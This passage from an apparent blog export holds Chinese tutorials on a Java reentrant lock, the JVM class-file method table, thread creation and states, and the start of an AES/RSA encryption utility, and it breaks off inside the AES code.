false; &#125; @Override public Condition newCondition() &#123; return null; &#125; &#125; 4. 升级为可重入版本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/** * 02版本才是可重入锁 * @author swg * */public class MyLock02 implements Lock&#123; private boolean isLocked = false; //指向第一次拿到锁的线程 Thread lockBy = null; //用于计数：加一次锁则加1,释放一次锁则减1,lockCount=0的时候则表示可以全部释放完毕，可以把其他的线程唤醒加入了 int lockCount = 0; @Override public synchronized void lock() &#123; //获取当前线程 Thread currentThread = Thread.currentThread(); //isLocked：第一次进来，为false，不进入while循环等待 //不是第一次进来，当前线程不为lockBy的时候（表示其他的线程进来就让其等待） while(isLocked &amp;&amp; currentThread != lockBy)&#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; //第一个拿到锁的线程或者本线程再拿到同一个对象的锁（重入） isLocked = true; lockBy = currentThread; lockCount++; &#125; @Override public synchronized void unlock() &#123; //只有当前线程等于lockBy的时候，才表示释放当前线程的锁 if(lockBy == Thread.currentThread())&#123; //用lockCount来表示当前线程是否已经完全释放锁（包括重入的也已经执行完毕） lockCount--; //只有当前线程的锁已经全部释放的时候，才会将标志位恢复并且唤醒其他的一个线程 if(lockCount == 0)&#123; isLocked = false; notify(); &#125; &#125; &#125; @Override public void lockInterruptibly() throws InterruptedException &#123; &#125; @Override public boolean tryLock() &#123; return false; &#125; @Override public boolean tryLock(long time, TimeUnit unit) throws InterruptedException &#123; return false; &#125; @Override public Condition newCondition() &#123; return null; &#125; &#125;]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[九、Class文件中的方法表集合--method方法在class文件中是怎样组织的]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B9%9D%E3%80%81Class%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95%E8%A1%A8%E9%9B%86%E5%90%88--method%E6%96%B9%E6%B3%95%E5%9C%A8class%E6%96%87%E4%BB%B6%E4%B8%AD%E6%98%AF%E6%80%8E%E6%A0%B7%E7%BB%84%E7%BB%87%E7%9A%84%2F</url>
    <content type="text"><![CDATA[继续讲class文件中的方法表集合。 1. 方法表集合概述方法表集合是指由若干个方法表（method_info）组成的集合。对于在类中定义的若干个经过JVM编译成class文件后，会将相应的method方法信息组织到一个叫做方法表集合的结构中，字段表集合是一个类数组结构，如下图所示： 2. method方法的描述-方法表集合在class文件中的位置method方法的描述-方法表集合紧跟在字段表集合的后面，如下图所示： 3. 一个类中的method方法应该包含哪些信息？—-method_info结构体的定义对于一个方法的表示，我们根据我们可以概括的信息如下所示： 实际上JVM还会对method方法的描述添加其他信息，我们将在后面详细讨论。如上图中的method_info结构体的定义，该结构体的定义跟描述field字段 的field_info结构体的结构几乎完全一致,如下图所示。 方法表的结构体由：访问标志(access_flags)、名称索引(name_index)、描述索引(descriptor_index)、属性表(attribute_info)集合组成。 访问标志(access_flags)： method_info结构体最前面的两个字节表示的访问标志（access_flags），记录这这个方法的作用域、静态or非静态、可变性、是否可同步、是否本地方法、是否抽象等信息，实际上不止这些信息，我们后面会详细介绍访问标志这两个字节的每一位具体表示什么意思。 名称索引(name_index)： 紧跟在访问标志（access_flags）后面的两个字节称为名称索引，这两个字节中的值指向了常量池中的某一个常量池项，这个方法的名称以UTF-8格式的字符串存储在这个常量池项中。如public void methodName(),很显然，“methodName”则表示着这个方法的名称，那么在常量池中会有一个CONSTANT_Utf8_info格式的常量池项，里面存储着“methodName”字符串，而mehodName()方法的方法表中的名称索引则指向了这个常量池项。 描述索引(descriptor_index)： 描述索引表示的是这个方法的特征或者说是签名，一个方法会有若干个参数和返回值，而若干个参数的数据类型和返回值的数据类型构成了这个方法的描述，其基本格式为： (参数数据类型描述列表)返回值数据类型 。我们将在后面继续讨论。 属性表(attribute_info)集合： 这个属性表集合非常重要，方法的实现被JVM编译成JVM的机器码指令，机器码指令就存放在一个Code类型的属性表中；如果方法声明要抛出异常，那么异常信息会在一个Exceptions类型的属性表中予以展现。Code类型的属性表可以说是非常复杂的内容，也是本文最难的地方。 4. 访问标志(access_flags)—记录着method方法的访问信息访问标志（access_flags）共占有2 个字节，分为 16 位，这 16位 表示的含义如下所示： 举例：某个类中定义了如下方法： 12public static synchronized final void greeting()&#123; &#125; greeting()方法的修饰符有：public、static、synchronized、final 这几个修饰符修饰，那么相对应地，greeting()方法的访问标志中的ACC_PUBLIC、ACC_STATIC、ACC_SYNCHRONIZED、ACC_FINAL标志位都应该是1，即： 从上图中可以看出访问标志的值应该是二进制00000000 00111001,即十六进制0x0039。我们将在文章的最后一个例子中证实这点。 5. 名称索引和描述符索引—-一个方法的签名紧接着访问标志（access_flags）后面的两个字节，叫做名称索引(name_index)，这两个字节中的值是指向了常量池中某个常量池项的索引，该常量池项表示这这个方法名称的字符串。 方法描述符索引(descrptor_index)是紧跟在名称索引后面的两个字节，这两个字节中的值跟名称索引中的值性质一样，都是指向了常量池中的某个常量池项。这两个字节中的指向的常量池项，是表示了方法描述符的字符串。 所谓的方法描述符，实质上就是指用一个什么样的字符串来描述一个方法，方法描述符的组成如下图所示： 举例：对于如下定义的的greeting()方法，我们来看一下对应的method_info结构体中的名称索引和描述符索引信息是怎样组织的。 12public static synchronized final void greeting()&#123; &#125; 如下图所示,method_info结构体的名称索引中存储了一个索引值x，指向了常量池中的第x项，第 x项表示的是字符串”greeting”,即表示该方法名称是”greeting”；描述符索引中的y 值指向了常量池的第y项，该项表示字符串”()V”，即表示该方法没有参数，返回值是void类型。 6. 属性表集合–记录方法的机器指令和抛出异常等信息属性表集合记录了某个方法的一些属性信息，这些信息包括： 这个方法的代码实现，即方法的可执行的机器指令 这个方法声明的要抛出的异常信息 这个方法是否被@deprecated注解表示 这个方法是否是编译器自动生成的 属性表（attribute_info）结构体的一般结构如下所示： ++修正：属性长度为4个字节。++ 6.1 Code类型的属性表–method方法中的机器指令的信息Code类型的属性表(attribute_info)可以说是class文件中最为重要的部分，因为它包含的是JVM可以运行的机器码指令，JVM能够运行这个类，就是从这个属性中取出机器码的。除了要执行的机器码，它还包含了一些其他信息，如下所示： Code属性表的组成部分： 机器指令—-code： 目前的JVM使用一个字节表示机器操作码，即对JVM底层而言，它能表示的机器操作码不多于2的 8 次方，即 256个。class文件中的机器指令部分是class文件中最重要的部分，并且非常复杂，本文的重点不止介绍它 异常处理跳转信息—exception_table： 如果代码中出现了try{}catch{}块，那么try{}块内的机器指令的地址范围记录下来，并且记录对应的catch{}块中的起始机器指令地址，当运行时在try块中有异常抛出的话，JVM会将catch{}块对应懂得其实机器指令地址传递给PC寄存器，从而实现指令跳转； Java源码行号和机器指令的对应关系—LineNumberTable属性表： 编译器在将java源码编译成class文件时，会将源码中的语句行号跟编译好的机器指令关联起来，这样的class文件加载到内存中并运行时，如果抛出异常，JVM可以根据这个对应关系，抛出异常信息，告诉我们我们的源码的多少行有问题，方便我们定位问题。这个信息不是运行时必不可少的信息，但是默认情况下，编译器会生成这一项信息，如果你项取消这一信息，你可以使用-g:none 或-g:lines来取消或者要求设置这一项信息。如果使用了-g:none来生成class文件，class文件中将不会有LineNumberTable属性表，造成的影响就是 将来如果代码报错，将无法定位错误信息报错的行，并且如果项调试代码，将不能在此类中打断点（因为没有指定行号。） 局部变量表描述信息—-LocalVariableTable属性表： 局部变量表信息会记录栈帧局部变量表中的变量和java源码中定义的变量之间的关系，这个信息不是运行时必须的属性，默认情况下不会生成到class文件中。你可以根据javac指令的-g:none或者-g:vars选项来取消或者设置这一项信息。它有什么作用呢？ 当我们使用IDE进行开发时，最喜欢的莫过于它们的代码提示功能了。如果在项目中引用到了第三方的jar包，而第三方的包中的class文件中有无LocalVariableTable属性表的区别如下所示： Code属性表结构体的解释： attribute_name_index,属性名称索引，占有2个字节，其内的值指向了常量池中的某一项，该项表示字符串“Code”; attribute_length,属性长度，占有 4个字节，其内的值表示后面有多少个字节是属于此Code属性表的； max_stack,操作数栈深度的最大值，占有 2 个字节，在方法执行的任意时刻，操作数栈都不应该超过这个值，虚拟机的运行的时候，会根据这个值来设置该方法对应的栈帧(Stack Frame)中的操作数栈的深度； max_locals,最大局部变量数目，占有 2个字节，其内的值表示局部变量表所需要的存储空间大小； code_length,机器指令长度，占有 4 个字节，表示跟在其后的多少个字节表示的是机器指令； code,机器指令区域，该区域占有的字节数目由 code_length中的值决定。JVM最底层的要执行的机器指令就存储在这里； exception_table_length,显式异常表长度，占有2个字节，如果在方法代码中出现了try{} catch()形式的结构，该值不会为空，紧跟其后会跟着若干个exception_table结构体，以表示异常捕获情况； exception_table，显式异常表，占有8 个字节，start_pc,end_pc,handler_pc中的值都表示的是PC计数器中的指令地址。exception_table表示的意思是：如果字节码从第start_pc行到第end_pc行之间出现了catch_type所描述的异常类型，那么将跳转到handler_pc行继续处理。 attribute_count,属性计数器，占有 2 个字节，表示Code属性表的其他属性的数目 attribute_info,表示Code属性表具有的属性表，它主要分为两个类型的属性表：“LineNumberTable”类型和“LocalVariableTable”类型。“LineNumberTable”类型的属性表记录着Java源码和机器指令之间的对应关系“LocalVariableTable”类型的属性表记录着局部变量描述 举例： 如下定义Simple类，使用javac -g:none Simple.java 编译出Simple.class 文件，并使用javap -v Simple &gt; Simple.txt 查看反编译的信息，然后看Simple.class文件中的方法表集合是怎样组织的： 12345public class Simple &#123; public static synchronized final void greeting()&#123; int a = 10; &#125; &#125; 1. Simple.class文件组织信息如下所示： 如上所示，方法表集合使用了蓝色线段圈了起来。请注意：方法表集合的头两个字节，即方法表计数器（method_count）的值是0x0002，它表示该类中有2 个方法。细心的读者会注意到，我们的Simple.java中就定义了一个greeting()方法，为什么class文件中会显示有两个方法呢？？ JVM为没有显式定义实例化构造方法的类，自动生成默认的实例化构造方法”()” 除了实例化构造方法，JVM还会在特殊的情况下生成一个叫类构造方法”()”。如果我们在类中使用到了static修饰的代码块，那么，JVM会在class文件中生成一个“()”构造方法。关于它们的具体细节，我将在后续的文章中详细讨论，在这里就不展开了。 Simple.class 中的() 方法: 解释： 方法访问标志(access_flags)： 占有 2个字节，值为0x0001,即标志位的第 16 位为 1，所以该()方法的修饰符是：ACC_PUBLIC; 名称索引(name_index)： 占有 2 个字节，值为 0x0004，指向常量池的第 4项，该项表示字符串“”，即该方法的名称是“”; 描述符索引(descriptor_index): 占有 2 个字节，值为0x0005,指向常量池的第 5 项，该项表示字符串“()V”，即表示该方法不带参数，并且无返回值（构造函数确实也没有返回值）； 属性计数器（attribute_count): 占有 2 个字节，值为0x0001,表示该方法表中含有一个属性表，后面会紧跟着一个属性表； 属性表的名称索引(attribute_name_index)：占有 2 个字节，值为0x0006,指向常量池中的第6 项，该项表示字符串“Code”，表示这个属性表是Code类型的属性表； 属性长度（attribute_length）：占有4个字节，值为0x0000 0011，即十进制的 17，表明后续的 17 个字节可以表示这个Code属性表的属性信息； 操作数栈的最大深度（max_stack）：占有2个字节，值为0x0001,表示栈帧中操作数栈的最大深度是1； 局部变量表的最大容量（max_variable）：占有2个字节，值为0x0001, JVM在调用该方法时，根据这个值设置栈帧中的局部变量表的大小； 机器指令数目(code_length)：占有4个字节，值为0x0000 0005,表示后续的5 个字节 0x2A 、0xB7、 0x00、0x01、0xB1表示机器指令; 机器指令集(code[code_length])：这里共有 5个字节，值为0x2A 、0xB7、 0x00、0x01、0xB1； 显式异常表集合（exception_table_count）： 占有2 个字节，值为0x0000,表示方法中没有需要处理的异常信息； Code属性表的属性表集合（attribute_count）： 占有2 个字节，值为0x0000，表示它没有其他的属性表集合，因为我们使用了-g:none 禁止编译器生成Code属性表的 LineNumberTable 和LocalVariableTable; B. Simple.class 中的greeting() 方法: 解释： 方法访问标志(access_flags)： 占有 2个字节，值为 0x0039 ,即二进制的00000000 00111001,即标志位的第11、12、13、16位为1，根据上面讲的方法标志位的表示，可以得到该greeting()方法的修饰符有：ACC_SYNCHRONIZED、ACC_FINAL、ACC_STATIC、ACC_PUBLIC; 名称索引(name_index)： 占有 2 个字节，值为 0x0007，指向常量池的第 7 项，该项表示字符串“greeting”，即该方法的名称是“greeting”; 描述符索引(descriptor_index): 占有 2 个字节，值为0x0005,指向常量池的第 5 项，该项表示字符串“()V”，即表示该方法不带参数，并且无返回值； 属性计数器（attribute_count): 占有 2 个字节，值为0x0001,表示该方法表中含有一个属性表，后面会紧跟着一个属性表； 属性表的名称索引(attribute_name_index)：占有 2 个字节，值为0x0006,指向常量池中的第6 项，该项表示字符串“Code”，表示这个属性表是Code类型的属性表； 属性长度（attribute_length）：占有4个字节，值为0x0000 0010，即十进制的16，表明后续的16个字节可以表示这个Code属性表的属性信息； 操作数栈的最大深度（max_stack）：占有2个字节，值为0x0001,表示栈帧中操作数栈的最大深度是1； 局部变量表的最大容量（max_variable）：占有2个字节，值为0x0001, JVM在调用该方法时，根据这个值设置栈帧中的局部变量表的大小； 机器指令数目(code_length)：占有4 个字节，值为0x0000 0004,表示后续的4个字节0x10、 0x0A、 0x3B、0xB1的是表示机器指令; 机器指令集(code[code_length])：这里共有4 个字节，值为0x10、 0x0A、 0x3B、0xB1 ； 显式异常表集合（exception_table_count）： 占有2 个字节，值为0x0000,表示方法中没有需要处理的异常信息； Code属性表的属性表集合（attribute_count）： 占有2 个字节，值为0x0000，表示它没有其他的属性表集合，因为我们使用了-g:none 禁止编译器生成Code属性表的 LineNumberTable 和LocalVariableTable; 6.2 Exceptions类型的属性表—-method方法声明的要抛出的异常信息有些方法在定义的时候，会声明该方法会抛出什么类型的异常，如下定义一个Interface接口，它声明了sayHello()方法，抛出Exception异常： 123public interface Interface &#123; public void sayHello() throws Exception; &#125; 现在让我们看一下Exceptions类型的属性表(attribute_info)结构体是怎样组织的： 如上图所示，Exceptions类型的属性表(attribute_info)结构体由一下元素组成： 属性名称索引(attribute_name_index)：占有 2个字节，其中的值指向了常量池中的表示”Exceptions”字符串的常量池项； 属性长度(attribute_length)：它比较特殊，占有4个字节，它的值表示跟在其后面多少个字节表示异常信息； 异常数量(number_of_exceptions)：占有2 个字节，它的值表示方法声明抛出了多少个异常，即表示跟在其后有多少个异常名称索引； 异常名称索引(exceptions_index_table)：占有2个字节，它的值指向了常量池中的某一项，该项是一个CONSTANT_Class_info类型的项，表示这个异常的完全限定名称； Exceptions类型的属性表的长度计算 如果某个方法定义中，没有声明抛出异常，那么，表示该方法的方法表(method_info)结构体中的属性表集合中不会有Exceptions类型的属性表；换句话说，如果方法声明了要抛出的异常，方法表(method_info)结构体中的属性表集合中必然会有Exceptions类型的属性表，并且该属性表中的异常数量不小于1。我们假设异常数量中的值为 N，那么后面的异常名称索引的数量就为N，它们总共占有的字节数为N*2，而异常数量占有2个字节，那么将有下面的这个关系式： 属性长度(attribute_length)中的值= 2 + 2*异常数量(number_of_exceptions)中的值 Exceptions类型的属性表（attribute_info）的长度=2+4+属性长度(attribute_length)中的值 举例：将上面定义的Interface接口类编译成class文件，然后我们查看Interface.class文件，找出方法表集合所在位置和相应的数据，并辅助javap -v Inerface 查看 由于sayHello()方法是在的Interface接口类中声明的，它没有被实现，所以它对应的方法表(method_info)结构体中的属性表集合中没有Code类型的属性表。 方法计数器（methods_count）中的值为0x0001，表明其后的方法表(method_info)就一个,即我们就定义了一个方法，其后会紧跟着一个方法表(method_info)结构体； 方法的访问标志（access_flags）的值是0x0401，二进制是00000100 00000001,第6位和第16位是1，对应上面的标志位信息，可以得出它的访问标志符有：ACC_ABSTRACT、ACC_PUBLIC。细心的读者可能会发现，在上面声明的sayHello()方法中并没有声明为abstract类型啊。确实如此，这是因为编译器对于接口内声明的方法自动加上ACC_ABSTRACT标志。 名称索引（name_index）中的值为0x0005，0x0005指向了常量池的第5项，第五项表示的字符串为“sayHello”，即表示的方法名称是sayHello 描述符索引(descriptor_index)中的值为0x0006,0x0006指向了常量池中的第6项，第6项表示的字符串为“()V” 表示这个方法的无入参，返回值为void类型 属性表计数器(attribute_count)中的值为0x0001,表示后面的属性表的个数就1个，后面紧跟着一个attribute_info结构体； 属性表（attribute_info）中的属性名称索引(attribute_name_index)中的值为0x0007，0x0007指向了常量池中的第7 项，第 7项指向字符串“Exceptions”，即表示该属性表表示的异常信息； 属性长度（attribute_length）中的值为：0x00000004,即后续的4个字节将会被解析成属性值； 异常数量（number_of_exceptions）中的值为0x0001,表示这个方法声明抛出的异常个数是1个； 异常名称索引(exception_index_table)中的值为0x0008,指向了常量池中的第8项，第8项表示的是CONSTANT_Class_info类型的常量池项，表示“java/lang/Exception”，即表示此方法抛出了java.lang.Exception异常。 7. IDE代码提示功能实现的基本原理每个IDE都提供了代码提示功能，它们实现的基本原理其实就是IDE针对它们项目下的包中所有的class文件进行建模，解析出它们的方法信息，当我们一定的条件时，IDE会自动地将合适条件的方法列表展示给开发者，供开发者使用。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三、线程的创建和线程状态]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%89%E3%80%81%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[本文总结几种主要的创建线程的方式。其实，Runnable和Callable的作用只是定义任务，创建线程还是需要Thread构造器。 1. Runnable线程可以驱动任务，所以我们需要定义任务，Runnable可以来实现这个需求。 Runnable是一个接口，其中只声明了一个run方法。 123public interface Runnable &#123; public abstract void run();&#125; 要想定义任务，只需要实现Runnable接口，并实现run方法。 下面通过实例看下如何通过实现Runnable创建和启动线程。 123456789101112131415161718192021//定义任务，作为一个线程任务，并不是开辟线程class MyThread2 implements Runnable &#123; // 重写run方法 public void run() &#123; for (int i = 0; i &lt; 3; i++) &#123; System.out.println(Thread.currentThread().getName() + "在运行"); &#125; &#125;&#125;public class MyRunnableTest &#123; public static void main(String[] args) &#123; MyThread2 mt= new MyThread2();// 创建任务 Thread t1 = new Thread(mt);//将任务附着在线程上 Thread t2 = new Thread(mt); t1.start();// 启动线程 t2.start(); &#125;&#125; 运行结果为： 123456Thread-1在运行Thread-0在运行Thread-0在运行Thread-1在运行Thread-0在运行Thread-1在运行 2. ThreadThread是一个类，它实现了Runnable，并额外提供了一些方法供用户使用。它的定义如下：1public class Thread implements Runnable &#123;...&#125; 下面通过实例看下如何通过继承Thread创建和启动线程。 123456789101112131415161718192021222324//定义线程类，是真正的线程class MyThread extends Thread &#123; //重写run方法 public void run() &#123; for (int i = 0; i &lt; 3; i++) &#123; System.out.println(this.getName() + "在运行"); &#125; &#125;&#125;;public class MyThreadTest &#123; public static void main(String[] args) &#123; MyThread t1 = new MyThread();// 创建线程 MyThread t2 = new MyThread(); t1.start();//启动线程 t2.start(); for (int i = 0; i &lt; 3; i++) &#123; System.out.println(Thread.currentThread().getName() + "在运行"); &#125; &#125;&#125; 运行结果为： 123456789Thread-1在运行main在运行Thread-0在运行main在运行Thread-1在运行main在运行Thread-0在运行Thread-0在运行Thread-1在运行 Thread-0和Thread-1是我们创建的线程，因为我们没有给它们命名，所以JVM为它们分配了两个名字。名字为main的线程是main方法所在的线程，也是主线程。主线程的名字总是main，非主线程的名字不确定。从执行结果中可以看到，几个线程不是顺序执行的，JVM和操作系统一起决定了线程的执行顺序。所以，你运行后可能看到的不是这样的打印顺序。 3. CallableCallable接口类似于Runnable，两者作用都是定义任务。不同的是，被线程执行后，Callable可以返回结果或抛出异常。而Runnable不可以。Callable的返回值可以通过Future来获取。Callable的定义如下： 1234@FunctionalInterfacepublic interface Callable&lt;V&gt; &#123; V call() throws Exception;&#125; 下面通过实例看下如何通过实现Callable创建和启动线程并获取返回值。 12345678910111213141516171819202122232425262728293031import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;//定义任务，泛型类型是Stringclass MyCallable implements Callable&lt;String&gt; &#123; @Override public String call() throws Exception &#123; return "This is returned string."; &#125;&#125;public class MyCallabeTest &#123; public static void main(String[] args)&#123; //创建有返回值的任务 Callable&lt;String&gt; callable = new MyCallable(); FutureTask&lt;String&gt; task = new FutureTask&lt;&gt;(callable); // 创建并启动线程 new Thread(task).start(); String result = null; try &#123; //调用get()阻塞主线程，并获取返回值 result = task.get(); &#125; catch (InterruptedException | ExecutionException e) &#123; e.printStackTrace(); &#125; System.out.println("return : " + result); &#125;&#125; 运行main方法后打印结果为 return : This is returned string. FutureTask实现了Runnable和Callable接口，所以它既可以作为任务附加到线程上（new Thread(task).start();），又可以作为Future获取Callable的返回值（result = task.get();）。 下面介绍另一种使用Callable和Future的方法。 12345678910111213141516171819202122232425262728import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.Future;public class MyCallabeTest2 &#123; public static void main(String[] args)&#123; //创建有返回值的任务。Callable使用第一个例子中的MyCallable Callable&lt;String&gt; callable = new MyCallable(); //创建线程执行器 ExecutorService threadPool = Executors.newSingleThreadExecutor(); //通过线程执行器执行callable，并通过future获取返回结果 Future&lt;String&gt; future = threadPool.submit(callable); String result = null; try &#123; // 调用get()阻塞主线程，并获取返回值 result = future.get(); &#125; catch (InterruptedException | ExecutionException e) &#123; e.printStackTrace(); &#125; finally&#123; threadPool.shutdown(); &#125; System.out.println("return : " + result); &#125;&#125; 运行main方法后打印结果为 return : This is returned string. Java SE5的Java.util.concurrent包中的Executor（执行器）可以为我们管理线程，从而简化了并发编程。ExecutorService继承自Executor。下面会详细讲执行器。 下面介绍一种使用Callable和Future的获取多个返回值的方法。 12345678910111213141516171819202122232425262728293031323334353637383940import java.util.ArrayList;import java.util.Random;import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.Future;//定义任务class MyCallable3 implements Callable&lt;Integer&gt; &#123; @Override public Integer call() throws Exception &#123; return new Random().nextInt(100); &#125;&#125;public class MyCallabeTest3 &#123; public static void main(String[] args)&#123; //创建线程执行器 ExecutorService threadPool = Executors.newSingleThreadExecutor(); //创建Future类型的集合 ArrayList&lt;Future&lt;Integer&gt;&gt; results = new ArrayList&lt;Future&lt;Integer&gt;&gt;(); //将Executor提交的任务的返回值添加到集合中 for(int i = 0;i&lt;5;i++) results.add(threadPool.submit(new MyCallable3())); //遍历集合取出数据 try &#123; // 调用get()阻塞主线程，并获取返回值 for(Future result:results) System.out.println(result.get()); &#125; catch (InterruptedException | ExecutionException e) &#123; e.printStackTrace(); &#125; finally&#123; threadPool.shutdown(); &#125; &#125;&#125; 运行main方法后打印结果为 1234544946311 4. 线程池在上面的例子中使用了线程执行器，也就是线程池。有人说线程池也是创建线程的一种方式，但看过线程池的源码就知道，线程池创建线程执行任务也是依赖于Thread的。 下面再看个例子： 1234567891011121314151617181920import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class MyCallabeTest4 &#123; public static void main(String[] args) &#123; //开辟10个线程连接的线程池，避免线程不停地创建和销毁带来的性能损耗 ExecutorService threadPool = Executors.newFixedThreadPool(10); for(int i=0; i&lt;10; i++)&#123; threadPool.execute(new Runnable() &#123; @Override public void run() &#123; System.out.println(Thread.currentThread().getName()); &#125; &#125;); &#125; //释放资源 threadPool.shutdown(); &#125;&#125; 执行结果：12345678910pool-1-thread-1pool-1-thread-2pool-1-thread-3pool-1-thread-5pool-1-thread-6pool-1-thread-4pool-1-thread-8pool-1-thread-7pool-1-thread-10pool-1-thread-9 将其中一句改为：1ExecutorService threadPool = Executors.newCachedThreadPool(); 跟newFixedThreadPool比较，newFixedThreadPool是根据你指定的数量来确定线程的数量，不够就等待；但是newCachedThreadPool是比较智能的，连接不够了就自动增加，连接结束就自动收回。 5. 总结Thread和Runnable该如何选择？ 因为Java不支持多继承，但支持多实现。所以从这个方面考虑Runnable比Thread有优势。 Thread中提供了一些基本方法。而Runnable中只有run方法。如果只想重写run()方法，而不重写其他Thread方法，那么应使用Runnable接口。除非打算修改或增强Thread类的基本行为，否则应该选择Runnable。 启动线程的方法是start方法。线程t启动后，t从新建状态转为就绪状态， 但并没有运行。 t获取CPU权限后才会运行，运行时执行的方法就是run方法。此时有t和主线程两个线程在运行，如果t阻塞，可以直接继续执行主线程中的代码。 直接运行run方法也是合法的，但此时并没有新启动一个线程，run方法是在主线程中执行的。此时只有主线程在运行，必须等到run方法中的代码执行完后才可以继续执行主线程中的代码。 线程只能被启动一次 一个线程一旦被启动，它就不能再次被启动。在例2中在代码t1.start();后再加一句t1.start();，再运行会抛出java.lang.IllegalThreadStateException。 6. 线程状态 NEW新建状态。尚未启动的线程的状态。如 MyThread thread = new MyThread(); thread就处于NEW状态。 RUNNABLE就绪状态（可运行状态）。可运行线程的线程状态。thread.start();后，thread就处在处于RUNNABLE状态。RUNNABLE状态的某一线程可能正在Java虚拟机中运行，但它也可能正在等待操作系统中的其他资源，比如CPU。一个线程在获得CPU的资源后，才可以执行任务，否则排队等待。 BLOCKED阻塞状态。 线程因为某些原因暂时停止运行，它就进入了阻塞状态。直到某些条件发生，线程进入就绪状态，才有机会继续运行。线程进入阻塞状态有如下原因： 运行时的线程调用某一对象的同步方法，若该对象的同步锁被别的线程占用，就只好进入阻塞状态。等到获得了同步锁，才能进入就绪状态。（API上只说了这一个原因） 线程执行I/O操作或进行远程通信时，会因为等待相关的资源而进入阻塞状态。等到获得了相关资源，才能进入就绪状态。（待确定） WAITING等待状态。某一等待线程的线程状态。处于等待状态的线程正等待另一个线程，以执行特定操作。某一线程因为调用下列方法之一而处于等待状态： 不带超时值的Object.wait。已经在某一对象上调用了Object.wait()的线程正等待另一个线程，以便在该对象上调用Object.notify()或Object.notifyAll()。 不带超时值的Thread.join。已经调用了Thread.join()的线程正在等待指定线程终止。 LockSupport.park。 TIMED_WAITING定时等待状态。具有指定等待时间的某一等待线程的线程状态。某一线程因为调用以下带有指定正等待时间的方法之一而处于定时等待状态： Thread.sleep。线程执行了Thread.sleep(int n)方法，线程将在n毫秒内放弃CPU，然后进入就绪状态。 带有超时值的Object.wait。已经在某一对象上调用了Object.wait(long timeout)的线程正等待另一个线程，当对应的notify()被调用或者超出指定时间时线程重新进入就绪状态。 带有超时值的Thread.join。例如，已经调用了join(long millis)的线程正在等待指定线程终止。等待该线程终止的时间最长为millis毫秒。超时为 0 意味着要一直等下去。 LockSupport.parkNanos。 LockSupport.parkUntil。 TERMINATED终止状态。已终止线程的线程状态。线程已经结束执行。 简单的线程状态表示图： 补充了解怎样理解线程的睡眠，挂起，和阻塞？ 挂起和睡眠是主动的，挂起恢复需要主动完成，睡眠恢复则是自动完成的，因为睡眠有一个睡眠时间，睡眠时间到则恢复到就绪态。而阻塞是被动的，是在等待某种事件或者资源的表现，一旦获得所需资源或者事件信息就自动回到就绪态。 睡眠和挂起是两种行为，阻塞则是一种状态。 操作系统中睡眠、阻塞、挂起的区别形象解释：首先这些术语都是对于线程来说的。 对线程的控制就好比你控制了一个雇工为你干活。你对雇工的控制是通过编程来实现的。 挂起线程的意思就是你对主动对雇工说：“你睡觉去吧，用着你的时候我主动去叫你，然后接着干活”。 使线程睡眠的意思就是你主动对雇工说：“你睡觉去吧，某时某刻过来报到，然后接着干活”。 线程阻塞的意思就是，你突然发现，你的雇工不知道在什么时候没经过你允许，自己睡觉呢，但是你不能怪雇工，肯定你这个雇主没注意，本来你让雇工扫地，结果扫帚被偷了或被邻居家借去了，你又没让雇工继续干别的活，他就只好睡觉了。至于扫帚回来后，雇工会不会知道，会不会继续干活，你不用担心，雇工一旦发现扫帚回来了，他就会自己去干活的。因为雇工受过良好的培训。这个培训机构就是操作系统。]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三、整合加密]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%89%E3%80%81%E6%95%B4%E5%90%88%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[对称加密和非对称加密保证信息传输的安全性。 1、session问题对于分布式系统，session存在一致性的问题，如果session都是放在服务器中， 那么分布式的情况下，每一个服务器里面的session都不一致。 采取的方案是将其放在外面的redis中。 对于移动端来说，是无状态的，没有session（session是有状态的）， 但是session只是用来唯一标识会话和用户，那么只要有一个东西可以唯一标识就行了， 方案是用户登陆时自动生成一个token，相当于session，用于唯一标识用户， 并且给这个token设置过期时间，用户每次请求时都会携带token，服务端进行相应的验证。 2、传输加密理论md5 是我们常见的数字签名加密方式，是不可逆的，即服务端不能解密，显然是无法满足本系统要求的。 对称加密 加密模式是：明文+key(密钥)=密文，服务端用密文+key(密钥)=明文进行解密，所谓对称是指两个key是完全一样的。 效率比非对称加密方式要高，但是在http传输协议中，key会被有心之人截取，那么拿到这个key就可以解密，是不安全的。 非对称加密 明文+公钥=密文，密文+私钥=明文。公钥被截取也没事， 只要私钥在我服务器里面不被截取出来就行，安全性比较高，但是效率较低。 本系统结合两者的优点，既要保证传输时key要安全，不被截取破解， 也要保证一定的效率：对数据+key进行对称加密，其中对key进行非对称加密。 服务端解密的过程是：根据非对称方式解密得到key，然后根据对称方式解密出明文。 AES是典型的对称加密，RSA是典型的非对称加密。 3、AES工具类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class AESUtil &#123; public static final String KEY_ALGORITHM = "AES"; public static final String KEY_ALGORITHM_MODE = "AES/CBC/PKCS5Padding"; /** * AES对称加密 * @param data * @param key key需要16位 * @return */ public static String encrypt(String data , String key) &#123; try &#123; SecretKeySpec spec = new SecretKeySpec(key.getBytes("UTF-8"),KEY_ALGORITHM); Cipher cipher = Cipher.getInstance(KEY_ALGORITHM_MODE); cipher.init(Cipher.ENCRYPT_MODE , spec,new 